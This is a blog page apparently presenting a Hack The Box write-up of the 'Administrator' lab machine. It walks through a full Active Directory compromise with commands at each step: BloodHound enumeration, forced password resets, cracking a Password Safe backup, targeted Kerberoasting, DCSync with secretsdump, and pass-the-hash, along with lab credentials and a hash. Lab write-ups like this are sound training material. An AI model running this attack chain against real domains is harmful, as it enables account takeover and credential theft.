<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <title>Matthew Castro - Blog</title>
    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico" />
    <!-- Font Awesome icons (free version)-->
    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
    <!-- Google fonts-->
    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
        type="text/css" />
    <link
        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
        rel="stylesheet" type="text/css" />
    <!-- Core theme CSS (includes Bootstrap)-->
    <link href="../../css/styles.css" rel="stylesheet" />
    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
    <link rel="preload" as="image" href="/assets/img/posts.jpg">
</head>

<body>
    <!-- Navigation-->
    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
        <div class="container px-4 px-lg-5">
            <a class="navbar-brand" href="../../index.html">Matthew Castro</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                Menu
                <i class="fas fa-bars"></i>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
                <ul class="navbar-nav ms-auto py-4 py-lg-0">
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">Homelab</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../reports.html">Reports</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../Write-ups.html">Write-ups</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../about.html">About</a></li>
                </ul>
            </div>
        </div>
    </nav>
    <!-- Page Header-->
    <header class="masthead" style="background-image: url('../../assets/img/posts.jpg')">
        <div class="container position-relative px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <div class="post-heading">
                        <h2>Administrator - Hack The Box Write-up</h2>
                        <span class="meta">
                            Posted on February 8th, 2026
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Post Content-->
    <article class="mb-4">
        <div class="container px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    We start the box with domain user credentials olivia:ichliebedich.
                    <p></p>
                    We first run an Nmap scan against the provided IP. This allows us to obtain the domain name and get an idea of the ports open on the box.
                    <p></p>
                        <span class="grey-line">sudo nmap -sC -sV -p- -T 5 10.129.11.170 </span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/1.png" alt="..." />                   
                        <p></p>
                        We also find the computer name in the results of our Nmap scan:
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/2.png" alt="..." />                   
                        <p></p>
                        We test the credentials against LDAP using NXC:                        
                        <p></p>
                        <span class="grey-line">nxc ldap 10.129.11.170 -u olivia -p ichliebedich</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/3.png" alt="..." />                   
                        <p></p>
                        We can then use the credentials to run SharpHound and collect info about the domain's users, objects and privilege relationships.
                        <p></p>
                        <span class="grey-line">bloodhound-python --zip -c All -d administrator.htb -u olivia -p ichliebedich -dc dc.administrator.htb -ns 10.129.11.170</span>
                        <p></p> 
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/4.png" alt="..." />                   
                        <p></p>
                        We upload the collected data into BloodHound to find our first attack vector. We can see that the user Olivia has GenericAll privileges over the user
                         Michael. This was found by clicking the "First-Degree Object Control" predefined query.
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/5.png" alt="..." />               
                        <p></p>
                        From there, we change Michael's password to gain access to his account. This can be done because we have full control over the "michael" object.
                        <p></p>    
                        <span class="grey-line">net rpc password "Michael" "Password123" -U "administrator.htb"/"olivia"%"ichliebedich" -S "10.129.11.170"</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/6.png" alt="..." />             
                        <p></p>  
                        In the screenshot, we clearly see that the password was successfully changed to "Password123".
                        <p></p>
                        We now have control over user Michael. We check BloodHound to find any potential lateral movement or privilege escalation vectors.
                         We notice that Michael has ForceChangePassword on user Benjamin. This relationship
                          was also discovered using the "First Degree Object Control" query.
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/7.png" alt="..." />             
                        <p></p>
                        We repeat the same attack we performed in the previous step.
                        <p></p>
                        <span class="grey-line">net rpc password "benjamin" "Password123" -U "administrator.htb"/"michael"%"Password123" -S "10.129.11.170" </span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/8.png" alt="..." />     
                        <p></p>        
                        I did not find any abuse vectors or special privileges when I examined Benjamin's privileges in BloodHound, but I did notice he was part of the
                         "Share Moderators" group. I then tried logging into FTP with his user and found an encrypted backup file. The FTP connection was successful
                          because it uses Windows authentication for its connections.
                        <p></p>
                        <span class="grey-line">ftp 10.129.11.170</span>
                        <p></p>
                        <span class="grey-line">ftp> dir</span>
                        <p></p>
                        <span class="grey-line">ftp> get Backup.psafe3</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/9.png" alt="..." />   
                        <p></p>  
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/10.png" alt="..." />   
                        <p></p>
                        After researching the file format, I understood that I can use pwsafe2john to get the hash of the password protecting the file.
                         We then crack the hash and obtain the password using John the Ripper. I then installed PasswordSafe on my Kali machine to open the file.
                          Once opened, we find the password for user Emily.
                        <p></p>
                        <span class="grey-line">pwsafe2john Backup.psafe3 > hash</span>
                        <p></p>
                        <span class="grey-line">john hash --wordlist=/usr/share/wordlists/rockyou.txt</span>    
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/11.png" alt="..." />   
                        <p></p>
                        We open the password file:
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/12.png" alt="..." />   
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/13.png" alt="..." />   
                        <p></p>
                        We test the credentials:
                        <p></p>
                        <span class="grey-line">crackmapexec smb 10.129.11.170 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' </span>    
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/14.png" alt="..." />   
                        <p></p>
                        We can go back to BloodHound and mark Emily as owned. The next attack vector is shown to us with the "First Degree Object Control" query.
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/15.png" alt="..." />   
                        <p></p>
                        With generic write privileges, we can perform a targeted Kerberoast attack by setting a fake SPN to user Ethan and Kerberoasting him,
                         allowing us to obtain his password hash. We must adjust our Kali machine time to the KDC time. This is because in the attack, we must
                          first obtain a valid TGT before we obtain a TGS, and to obtain a TGT we must send an AS-REQ which uses a timestamp in the authentication flow.
                        <p></p>
                        <span class="grey-line">python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'</span>    
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/16.png" alt="..." />   
                        <p></p>
                        <span class="grey-line">sudo rdate -n 10.129.11.170 && python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'</span>    
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/17.png" alt="..." />   
                        <p></p>
                        We crack the hash:
                        <p></p>
                        <span class="grey-line">vim ethan_hash </span>    
                        <p></p>
                        <span class="grey-line">hashcat ethan_hash /usr/share/wordlists/rockyou.txt</span>    
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/18.png" alt="..." />   
                        <p></p>
                        We now have valid credentials for user Ethan.
                        <p></p>
                        <span class="grey-line">crackmapexec smb 10.129.11.170 -u 'ethan' -p 'limpbizkit'</span>    
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/19.png" alt="..." />   
                        <p></p>
                        Looking over at BloodHound, we can see that user Ethan is allowed to perform a DCSync attack on the domain:
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/20.png" alt="..." />   
                        <p></p>
                        We perform a DCSync attack and obtain the administrator user password hash:
                        <p></p>
                        <span class="grey-line">impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'10.129.11.170'</span>    
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/21.png" alt="..." />   
                        <p></p>
                        We now have unrestricted domain access via PtH.
                        <p></p>
                        <span class="grey-line">crackmapexec smb 10.129.11.170 -u administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e' -x whoami </span>    
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/administrator/22.png" alt="..." />   

                </div>
            </div>
        </div>
    </article>
    <!-- Bootstrap core JS-->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Core theme JS-->
    <script src="js/scripts.js"></script>
</body>

</html>